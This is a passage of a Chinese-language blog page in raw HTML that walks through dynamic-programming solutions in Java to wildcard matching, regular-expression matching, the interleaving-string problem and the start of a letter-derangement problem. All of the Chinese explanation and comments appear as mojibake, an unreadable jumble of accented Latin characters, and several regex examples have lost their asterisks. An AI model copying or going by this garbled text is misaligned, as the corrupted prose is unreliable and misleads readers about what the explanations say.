class="number">1</span>][j]||dp[i][j-<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n][m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™ç»´æ‰“å‡»ï¼</p><p>S&#x3D;â€ acdcbâ€</p><p>P&#x3D; â€œa*c?bâ€</p><table><thead><tr><th></th><th><strong>Null</strong></th><th><strong>A</strong></th><th><strong>C</strong></th><th><strong>D</strong></th><th><strong>C</strong></th><th><strong>B</strong></th></tr></thead><tbody><tr><td><strong>Null</strong></td><td><strong>T</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td></tr><tr><td><strong>A</strong></td><td><strong>F</strong></td><td><strong>T</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td></tr><tr><td>*****</td><td><strong>F</strong></td><td><strong>T</strong></td><td><strong>T</strong></td><td><strong>T</strong></td><td><strong>T</strong></td><td><strong>T</strong></td></tr><tr><td><strong>C</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>T</strong></td><td><strong>F</strong></td><td><strong>T</strong></td><td><strong>F</strong></td></tr><tr><td><strong>?</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>T</strong></td><td><strong>F</strong></td><td><strong>T</strong></td></tr><tr><td><strong>B</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td></tr></tbody></table><table><thead><tr><th></th><th><strong>Null</strong></th><th><strong>A</strong></th><th><strong>C</strong></th><th><strong>D</strong></th><th><strong>C</strong></th><th><strong>B</strong></th></tr></thead><tbody><tr><td><strong>Null</strong></td><td><strong>T</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td></tr><tr><td><strong>A</strong></td><td><strong>F</strong></td><td><strong>T</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td></tr><tr><td>*****</td><td><strong>F</strong></td><td><strong>T</strong></td><td><strong>T</strong></td><td><strong>T</strong></td><td><strong>T</strong></td><td><strong>T</strong></td></tr><tr><td><strong>C</strong></td><td><strong>F</strong></td><td><strong>Position1</strong></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>?</strong></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>B</strong></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>ç”±äºä¸Šé¢éƒ½æ˜¯FTTTTTè€Œposition1çš„æ—¶å€™åº”è¯¥æ˜¯falseï¼Œç”±äºäºŒç»´æ•°ç»„é»˜è®¤åˆå§‹åŒ–æ˜¯falseï¼Œä¸€ç»´æ•°ç»„æ˜¯ç»§æ‰¿ä¸Šä¸€æ¬¡çš„å€¼ï¼Œå› æ­¤åˆ¤æ–­æ¡ä»¶å¾—æ”¹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMatch1</span><span class="params">(String s, String p)</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] sArr = s.toCharArray();</span><br><span class="line">    <span class="type">char</span>[] pArr = p.toCharArray();</span><br><span class="line">    <span class="type">int</span> n=pArr.length,m=sArr.length;</span><br><span class="line">    <span class="type">boolean</span>[] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[m + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">    <span class="type">boolean</span> tmp,pre=<span class="literal">true</span>;              </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;=n; i++) &#123;</span><br><span class="line">        pre=dp[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">0</span>]=dp[<span class="number">0</span>]&amp;&amp; pArr[i-<span class="number">1</span>]==<span class="string">&#x27;*&#x27;</span>; <span class="comment">//ç±»ä¼¼p=&quot;**a&quot; s=&quot;a&quot;æ¡ä»¶ä¸‹ </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;=m ; j++) &#123;</span><br><span class="line">            tmp=dp[j];</span><br><span class="line">            <span class="keyword">if</span>(pArr[i-<span class="number">1</span>]!=<span class="string">&#x27;*&#x27;</span>) dp[j]=pre&amp;&amp;(pArr[i-<span class="number">1</span>]==sArr[j-<span class="number">1</span>]||pArr[i-<span class="number">1</span>]==<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">            <span class="keyword">else</span> dp[j] = dp[j]||dp[j-<span class="number">1</span>];</span><br><span class="line">            pre=tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éš¾åº¦æŒºå¤§çš„ï¼Œæˆ‘ä¹Ÿä¸èƒ½è‡ªå·±æ”¹å‡ºæ¥ã€‚</p><h2><span id="10-regular-expression-matching">10. Regular Expression Matching Ã—</span></h2><p>Given an input string (s) and a pattern (p), implement regular expression matching with support for â€˜.â€™ and â€˜*â€™.</p><p>â€˜.â€™ Matches any single character.</p><p>â€˜*â€™ Matches zero or more of the preceding element.</p><p>The matching should cover the <strong>entire</strong> input string (not partial).</p><p><strong>Note:</strong></p><ul><li>s could be empty and     contains only lowercase letters a-z.</li><li>p could be empty and     contains only lowercase letters a-z, and characters     like . or *.</li></ul><p><strong>Example 1:</strong></p><p><strong>Input:</strong></p><p>s &#x3D; â€œaaâ€</p><p>p &#x3D; â€œaâ€</p><p><strong>Output:</strong> false</p><p><strong>Explanation:</strong> â€œaâ€ does not match the entire string â€œaaâ€.</p><p><strong>Example 2:</strong></p><p><strong>Input:</strong></p><p>s &#x3D; â€œaaâ€</p><p>p &#x3D; â€œa*â€</p><p><strong>Output:</strong> true</p><p><strong>Explanation:</strong> â€˜*â€™ means zero or more of the preceding element, â€˜aâ€™. Therefore, by repeating â€˜aâ€™ once, it becomes â€œaaâ€.</p><p><strong>Example 3:</strong></p><p><strong>Input:</strong></p><p>s &#x3D; â€œabâ€</p><p>p &#x3D; â€œ.*â€</p><p><strong>Output:</strong> true</p><p><strong>Explanation:</strong> â€œ.<em>â€œ means â€œzero or more (</em>) of any character (.)â€.</p><p><strong>Example 4:</strong></p><p><strong>Input:</strong></p><p>s &#x3D; â€œaabâ€</p><p>p &#x3D; â€œc<em>a</em>bâ€</p><p><strong>Output:</strong> true</p><p><strong>Explanation:</strong> c can be repeated 0 times, a can be repeated 1 time. Therefore, it matches â€œaabâ€.</p><p><strong>Example 5:</strong></p><p><strong>Input:</strong></p><p>s &#x3D; â€œmississippiâ€</p><p>p &#x3D; â€œmis<em>is</em>p*.â€</p><p><strong>Output:</strong> false</p><p>å’Œä¸Šä¸€é“é¢˜æœ‰ç‚¹åƒä½†æ˜¯æœ‰ç‚¹ä¸åŒï¼Œè¿˜æ˜¯å…ˆç”»å›¾ã€‚</p><p><img src="/2020/03/25/dp/clip_image001-1585282035109.png"></p><p><strong>é‡åˆ°åˆå§‹åŒ–é—®é¢˜æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”»å›¾ï¼Œç„¶åæˆ‘ä»¬éœ€è¦</strong></p><p>c*å¯ä»¥çœ‹åšæ˜¯null</p><p>å› æ­¤c*&#x3D;&#x3D;nullåˆå§‹åŒ–ä¸ºtrueåŒç†c<em>a</em>ä¹Ÿæ˜¯true</p><p>l åŒ¹é…ç©ºä¸²aa*å’Œaa</p><p>dp[i][j]&#x3D;dp[i-1][j];</p><p>l åŒ¹é…0ä¸ªå‰ä¸€ä¸ªå­—ç¬¦ï¼Œbc* b</p><p> dp[i][j]&#x3D;dp[i-2][j]</p><p>l ç„¶åå®ƒè¿˜æœ‰ä¸€ä¸ªåŠŸèƒ½å°±æ˜¯åŒ¹é…nä¸ªå‰ä¸ªå­—ç¬¦a*å’Œaaaaaa</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦åˆ¤æ–­a<em>çš„ç¬¬ä¸€ä¸ªaå’Œaaaaçš„åé¢å‡ ä¸ªaä¸€ä¸ä¸€æ ·ï¼Œå¦åˆ™ä¼šå‡ºç°a</em>åŒ¹é…abbbç­‰ç­‰æƒ…å†µï¼Œæˆ–è€…è¯´.*å¯ä»¥åŒ¹é…abccddç­‰ç­‰æƒ…å†µã€‚</p><p><strong>1.</strong>   **ba*<strong>å’Œbè¿™ç§æƒ…å†µä¸‹ï¼Œbå’Œaä¸ç›¸ç­‰ï¼Œé‚£ä¹ˆ*åªæœ‰æ¶ˆé™¤açš„æƒ…å†µä¸‹æ‰å¯èƒ½åŒ¹é…</strong></p><p><strong>2.</strong>   <strong>å¦‚æœæ˜¯p[]ç›¸ç­‰çš„æƒ…å†µä¸‹ã€‚</strong></p><p><strong>å¦‚æœæ˜¯a*å’Œaaaaè¿™ç§æƒ…å†µä¸‹ï¼Œæ­¤æ—¶*ä¸‹æ ‡ä¸ºiåªæœ‰a[i-1]å’Œa[j]ç›¸ç­‰çš„æƒ…å†µä¸‹ï¼Œ*ä»£è¡¨nä¸ªaæ‰æ˜¯æœ‰æ„ä¹‰çš„ã€‚</strong>dp[i][j-1]</p><p>**â€aaaâ€**å’Œâ€ab*a*c*aâ€æƒ…å†µä¸‹ï¼Œb*å’Œc*ä¸ºç©ºä¸”a*åªèƒ½ä»£è¡¨ä¸€ä¸ªaï¼Œ</p><p>*B**ä¸ºç©ºå°±æ˜¯ç­‰äºdp[i][j]&#x3D;dp[i-2][j];</p><p>*a**ä»£è¡¨ä¸€ä¸ªaå°±ç­‰äºdp[i][j]&#x3D;dp[i-1][j]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMatch</span><span class="params">(String s, String p)</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] s1 = s.toCharArray();</span><br><span class="line">    <span class="type">char</span>[] p1 = p.toCharArray();</span><br><span class="line">    <span class="type">int</span> n=s1.length,m=p1.length;</span><br><span class="line">    <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[m+<span class="number">1</span>][n+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= m; i++) </span><br><span class="line">        <span class="keyword">if</span>(p1[i-<span class="number">1</span>]==<span class="string">&#x27;*&#x27;</span>&amp;&amp;dp[i-<span class="number">2</span>][<span class="number">0</span>]) dp[i][<span class="number">0</span>]=<span class="literal">true</span>;        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p1[i-<span class="number">1</span>]==<span class="string">&#x27;.&#x27;</span>||s1[j-<span class="number">1</span>]==p1[i-<span class="number">1</span>])&#123;</span><br><span class="line">                dp[i][j]=dp[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(p1[i-<span class="number">1</span>]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p1[i-<span class="number">2</span>]==s1[j-<span class="number">1</span>]||p1[i-<span class="number">2</span>]==<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                    dp[i][j]=dp[i][j-<span class="number">1</span>]||dp[i-<span class="number">1</span>][j]||dp[i-<span class="number">2</span>][j];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    dp[i][j]=dp[i-<span class="number">2</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m][n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="97-interleaving-string">97. Interleaving String Ã—</span></h2><p>ç»™å®šä¸‰ä¸ªå­—ç¬¦ä¸² <em>s1</em>, <em>s2</em>, <em>s3</em>, éªŒè¯ <em>s3</em> æ˜¯å¦æ˜¯ç”± <em>s1</em> å’Œ <em>s2</em> äº¤é”™ç»„æˆçš„ã€‚</p><p><strong>ç¤ºä¾‹</strong> <strong>1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: s1 = &quot;aabcc&quot;, s2 = &quot;dbbca&quot;, s3 = &quot;aadbbcbcac&quot;</span><br><span class="line">è¾“å‡º: true</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹</strong> <strong>2:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: s1 = <span class="string">&quot;aabcc&quot;</span>, s2 = <span class="string">&quot;dbbca&quot;</span>, s3 = <span class="string">&quot;aadbbbaccc&quot;</span></span><br><span class="line">è¾“å‡º: <span class="literal">false</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isInterleave</span><span class="params">(String s1, String s2, String s3)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>, k=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span>[] c1=s1.toCharArray();</span><br><span class="line">    <span class="type">char</span>[] c2=s2.toCharArray();</span><br><span class="line">    <span class="type">char</span>[] c3=s3.toCharArray();</span><br><span class="line">    <span class="keyword">while</span>(k&lt;c3.length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;c1.length&amp;&amp;c3[k]==c1[i])&#123;</span><br><span class="line">            i++;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(j&lt;c2.length&amp;&amp;c3[k]==c2[j])&#123;</span><br><span class="line">            j++;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font color="orange"><strong>ç”¨ä¸‰ä¸ªæŒ‡é’ˆå¹¶ä¸è¡Œï¼Œå› ä¸ºå¦‚æœs3&#x3D;cac ï¼Œs1&#x3D;cï¼Œs2&#x3D;caå°±ä¸è¡Œäº†ã€‚æ‰€ä»¥è¿˜æ˜¯dpè§£ï¼Œå¦‚æœs1å’Œs2æ²¡æœ‰å…±åŒçš„å­—ç¬¦é‚£ä¹ˆå°±å¯ä»¥è¿‡äº†</strong></font></p><p>é¢˜ç›®çš„è¾“å…¥æ˜¯ä¸‰ä¸ªå­—ç¬¦ä¸²ï¼Œé—®å…¶ä¸­ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦èƒ½å¤Ÿäº¤é”™åˆå¹¶ç»„æˆç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸²ï¼Œ<font color="orange"><strong>ä¸€ä¸ªå­—ç¬¦ç›¸å¯¹äºå…¶ä»–å­—ç¬¦çš„é¡ºåºåœ¨åˆå¹¶ä¹‹åä¸èƒ½æ”¹å˜</strong></font>ï¼Œè¿™ä¹Ÿæ˜¯è¿™é“é¢˜çš„éš¾ç‚¹ï¼Œä¸ç„¶çš„è¯ä½ ç”¨ä¸€ä¸ªå“ˆå¸Œè¡¨å°±å¯ä»¥åšäº†ï¼Œä¸‰ä¸ªå­—ç¬¦ä¸²æ˜¯å¦æ„å‘³ç€è¦å¼€ä¸‰ç»´çš„çŠ¶æ€æ•°ç»„ï¼Ÿè¿˜æ˜¯å››ä¸ªæ­¥éª¤æ¥çœ‹çœ‹ï¼š</p><p>Â·  é—®é¢˜æ‹†è§£</p><p>åœ¨æ‹†è§£é—®é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»ä¿è¯å‰ä¸¤ä¸ªå­—ç¬¦ä¸²çš„å­—ç¬¦çš„æ€»æ•°é‡å¿…é¡»æ­£å¥½ç­‰äºç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸²çš„å­—ç¬¦æ€»æ•°é‡ï¼Œä¸ç„¶çš„è¯ï¼Œå†æ€ä¹ˆåˆå¹¶ä¹Ÿæ— æ³•å®Œå…¨ç­‰åŒã€‚è¿™é‡Œæœ‰ä¸€ä¸ªç‚¹ï¼Œå½“æˆ‘ä»¬è€ƒè™‘ str1(0â€¦i) å’Œ str2(0â€¦j) çš„æ—¶å€™ï¼Œå…¶å®ç¬¬ä¸‰ä¸ªå­—ä¸²éœ€è¦è€ƒè™‘çš„èŒƒå›´ä¹Ÿå°±ç¡®å®šäº†ï¼Œå°±æ˜¯ str3(0â€¦i+j)ã€‚å¦‚æœæˆ‘ä»¬è¦æ±‚è§£é—®é¢˜ str1(0â€¦m) å’Œ str2(0â€¦n) æ˜¯å¦èƒ½å¤Ÿäº¤é”™ç»„æˆ str3(0â€¦m+n)ï¼Œè¿˜æ˜¯ä¹‹å‰é‚£å¥è¯ï¼Œ<font color="orange"><strong>å­—ç¬¦ä¸²åŒ¹é…é—®é¢˜çš„æ ¸å¿ƒæ°¸è¿œæ˜¯å­—ç¬¦ä¹‹é—´çš„æ¯”è¾ƒ</strong>ï¼š</font></p><p>Â·  å¦‚æœ str1(m) &#x3D;&#x3D; str3(m+n)ï¼Œé—®é¢˜æ‹†è§£æˆè€ƒè™‘å­é—®é¢˜ str1(0â€¦m-1) å’Œ str2(0â€¦n) æ˜¯å¦èƒ½å¤Ÿäº¤é”™ç»„æˆ str3(0â€¦m+n-1)</p><p>Â·  å¦‚æœ str2(n) &#x3D;&#x3D; str3(m+n)ï¼Œé—®é¢˜æ‹†è§£æˆè€ƒè™‘å­é—®é¢˜ str1(0â€¦m) å’Œ str2(0â€¦n-1) æ˜¯å¦èƒ½å¤Ÿäº¤é”™ç»„æˆ str3(0â€¦m+n-1)</p><p>ä½ å¯èƒ½ä¼šé—®éœ€ä¸éœ€è¦è€ƒè™‘å­é—®é¢˜ str1(0â€¦m-1) å’Œ str2(0â€¦n-1)ï¼Ÿ</p><p>åœ¨è¿™é“é¢˜ç›®å½“ä¸­ï¼Œ<strong>ä¸éœ€è¦</strong>ï¼</p><p>åƒä¸‡ä¸è¦é¢˜ç›®åšå¤šäº†å°±å›ºå®šæ€ç»´äº†ï¼Œä¹‹å‰è¯´åˆ°è¿™ç±»é—®é¢˜å¯ä»¥è¯•ç€è€ƒè™‘ä¸‰ä¸ªç›¸é‚»å­é—®é¢˜æ˜¯ä¸ºäº†è®©ä½ æœ‰ä¸ªæ€è·¯ï¼Œèƒ½æ›´å¥½åœ°åˆ‡é¢˜ï¼Œå¹¶ä¸æ˜¯è¯´æ‰€æœ‰çš„å­—ç¬¦ä¸²åŒ¹é…é—®é¢˜éƒ½éœ€è¦è€ƒè™‘è¿™ä¸‰ä¸ªå­é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦é‡åˆ°å…·ä½“é—®é¢˜å…·ä½“åˆ†æã€‚</p><p>Â·  çŠ¶æ€å®šä¹‰</p><p>dp[i][j] è¡¨ç¤ºçš„æ˜¯ str1(0â€¦i) å’Œ str2(0â€¦j) æ˜¯å¦å¯ä»¥äº¤é”™ç»„æˆ str3(0â€¦i+j)ï¼Œè¿™é‡Œå†è¡¥å……è¯´æ˜ä¸‹ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸éœ€è¦å¼€å¤šä¸€ç»´çŠ¶æ€æ¥è¡¨ç¤º str3ï¼Œå…¶å®å¾ˆç®€å•ï¼Œstr3 çš„çŠ¶æ€æ˜¯ç”± str1 str2 å†³å®šçš„ï¼Œstr1 str2 å®šäº†ï¼Œstr3 å°±å®šäº†</p><p>Â·  é€’æ¨æ–¹ç¨‹</p><p>æŠŠä¹‹å‰é—®é¢˜æ‹†è§£ä¸­çš„æ–‡å­—æè¿°è½¬æ¢æˆçŠ¶æ€çš„è¡¨è¾¾å¼å°±æ˜¯é€’æ¨æ–¹ç¨‹ï¼š</p><p>str1(i) &#x3D;&#x3D; str3(i+j)<br> dp[i][j] |&#x3D; dp[i - 1][j]</p><p> str2(j) &#x3D;&#x3D; str3(i+j)<br> dp[i][j] |&#x3D; dp[i][j - 1]</p><p>Â·  å®ç°</p><p>åˆå§‹åŒ–çš„æ—¶å€™éœ€è¦è€ƒè™‘å•ä¸ªå­—ç¬¦ä¸²èƒ½å¦ç»„æˆ str3 å¯¹åº”çš„åŒºé—´ï¼Œè¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œç›´æ¥åˆ¤æ–­å‰ç¼€æ˜¯å¦ç›¸ç­‰å³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isInterleave</span><span class="params">(String s1, String s2, String s3)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">length1</span> <span class="operator">=</span> s1.length();</span><br><span class="line">    <span class="type">int</span> <span class="variable">length2</span> <span class="operator">=</span> s2.length();</span><br><span class="line">    <span class="type">int</span> <span class="variable">length3</span> <span class="operator">=</span> s3.length();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (length1 + length2 != length3) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[length1 + <span class="number">1</span>][length2 + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>[] sArr1 = s1.toCharArray();</span><br><span class="line">    <span class="type">char</span>[] sArr2 = s2.toCharArray();</span><br><span class="line">    <span class="type">char</span>[] sArr3 = s3.toCharArray();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= length1; ++i) &#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = dp[i - <span class="number">1</span>][<span class="number">0</span>] &amp;&amp; sArr1[i - <span class="number">1</span>] == sArr3[i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= length2; ++i) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][i] = dp[<span class="number">0</span>][i - <span class="number">1</span>] &amp;&amp; sArr2[i - <span class="number">1</span>] == sArr3[i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= length1; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= length2; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sArr3[i + j - <span class="number">1</span>] == sArr1[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                dp[i][j] |= dp[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (sArr3[i + j - <span class="number">1</span>] == sArr2[j - <span class="number">1</span>]) &#123;</span><br><span class="line">                dp[i][j] |= dp[i][j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[length1][length2];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯èƒ½é™ç»´æ‰“å‡»çš„ï¼ˆé™ç»´æ‰“å‡»çš„éš¾ç‚¹åœ¨äºåˆå§‹åŒ–ä»¥åŠtemporary memoï¼‰ï¼Œèƒ½åšå‡ºæ¥å°±è¡Œäº†å…¶å®ï¼Œä½†æ˜¯é¢è¯•å¯èƒ½é—®æ€ä¹ˆä¼˜åŒ–ã€‚</p><p>å¦‚æœè¿˜æ˜¯æ²¡æœ‰æ€è·¯ï¼Œé‚£å°±ç”»ç”»è¡¨æ ¼å§ï¼Œè€ƒè™‘å½“å‰æ ¼å­çš„æ—¶å€™ï¼Œçœ‹çœ‹å…¶ <font color="orange"><strong>å·¦è¾¹</strong>ï¼Œ<strong>ä¸Šè¾¹</strong>ï¼Œ<strong>å·¦ä¸Šè¾¹</strong> </font>è¿™ä¸‰ä¸ªæ ¼å­æ‰€ä»£è¡¨çš„å­é—®é¢˜çš„çŠ¶æ€ï¼Œæœ‰å®é™…æ•°æ®ä½œä¸ºè¾…åŠ©ï¼Œé—®é¢˜ä¹‹é—´çš„é€’è¿›å…³ç³»ç›¸å¯¹æ¥è¯´ä¼šæ¯”è¾ƒå¥½æ‰¾äº›ã€‚</p><h1><span id="æ¦‚ç‡dpé—®é¢˜">æ¦‚ç‡DPé—®é¢˜</span></h1><h2><span id="4-ä¿¡ä»¶é”™æ’">4. ä¿¡ä»¶é”™æ’ Ã—</span></h2><p>é¢˜ç›®æè¿°ï¼šæœ‰ N ä¸ª ä¿¡ å’Œ ä¿¡å°ï¼Œå®ƒä»¬è¢«æ‰“ä¹±ï¼Œæ±‚é”™è¯¯è£…ä¿¡æ–¹å¼çš„æ•°é‡ã€‚</p><p>å®šä¹‰ä¸€ä¸ªæ•°ç»„ dp å­˜å‚¨é”™è¯¯æ–¹å¼æ•°é‡ï¼Œdp[i] è¡¨ç¤ºå‰ i ä¸ªä¿¡å’Œä¿¡å°çš„é”™è¯¯æ–¹å¼æ•°é‡ã€‚å‡è®¾ç¬¬ i ä¸ªä¿¡è£…åˆ°ç¬¬ j ä¸ªä¿¡å°é‡Œé¢ï¼Œè€Œç¬¬ j ä¸ªä¿¡è£…åˆ°ç¬¬ k ä¸ªä¿¡å°é‡Œé¢ã€‚æ ¹æ® i å’Œ k æ˜¯å¦ç›¸ç­‰ï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼š</p><ul><li>i&#x3D;&#x3D;kï¼Œäº¤æ¢ i å’Œ j 